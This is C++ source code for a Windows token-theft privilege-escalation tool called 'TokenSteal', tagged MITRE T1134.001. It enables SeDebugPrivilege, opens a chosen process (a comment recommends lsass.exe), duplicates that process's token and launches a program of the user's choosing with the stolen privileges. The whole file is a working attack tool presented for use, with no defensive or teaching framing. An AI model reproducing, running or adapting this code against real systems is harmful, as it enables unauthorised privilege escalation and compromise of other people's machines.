/*
 * TokenSteal v1.0 - Windows Privilege Escalation
 * Author: X14F7 | 2026-03-07 | T1134.001 (MITRE ATT&CK)
 * Usage: ./tokensteal.exe
 * [!] Admin + SeDebugPrivilege required
 */



#include <windows.h>
#include <iostream>


using namespace std;

int pid;
HANDLE hprocess; 
BOOL hprocesstoken;
HANDLE Token;



BOOL setPriv(LPCWSTR privdeb){

    LUID luid;
    TOKEN_PRIVILEGES owntokenpriv;
    HANDLE owntoken;

    if(!LookupPrivilegeValueW(NULL, privdeb, &luid)){                
        return false; 

    }

    owntokenpriv.PrivilegeCount = 1;                                //Setting Attributes on our own token
    owntokenpriv.Privileges[0].Luid = luid;
    owntokenpriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; 
    
    if(!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &owntoken)){
        return false;
    }

    if(!AdjustTokenPrivileges(owntoken, FALSE, &owntokenpriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL)){
        return false;

    }

    return true;


}




HANDLE stealToken(int pid){

    hprocess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);

    if(hprocess == NULL){
        cout << "[!] Could not get process handle!" << endl;;
        Token = (HANDLE)NULL;
    }
    
    hprocesstoken = OpenProcessToken(hprocess, MAXIMUM_ALLOWED, &Token);

    if(hprocesstoken == NULL){
        cout << "[!] Could not get process token!" << endl;
        Token = (HANDLE)NULL;
    }

    if(Token != NULL){
    cout << "[+] Successfully stolen Token!: " << Token << endl;
    }

    return Token;   
    



}


BOOL createProc(HANDLE Token, LPCWSTR applicationpath){
    HANDLE iToken;
    STARTUPINFOW SInfo;
    PROCESS_INFORMATION PInfo;

    ZeroMemory(&SInfo, sizeof(SInfo));  
    ZeroMemory(&PInfo, sizeof(PInfo));


    DuplicateTokenEx(Token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &iToken);

    CreateProcessWithTokenW(iToken, LOGON_WITH_PROFILE, (LPCWSTR)applicationpath, NULL, 0, NULL, NULL, &SInfo, &PInfo);

    return true;



    


}



int main(){
    cout << "Whats the PID of the Process: "; //Preferably lsass.exe 
    cin >> pid;
    LPCWSTR applicationpath = L"C:\\Windows\\notepad.exe"; //Replace with the path of the application you want to start with higher privilege
    
    if(!setPriv(L"SeDebugPrivilege")){
        printf("[!] Could not enable SeDebugPrivilege on desired application");
        return -1;
        
    }

    Token = stealToken(pid);
    if(Token == NULL){
        return -1;
    }

    if(createProc(Token, applicationpath)){
        printf("[+] Application set on the desired privilage!");
    }
    else{
        printf("[!] Could not set application on the desired privilage");
        return -1;
    }
    

}




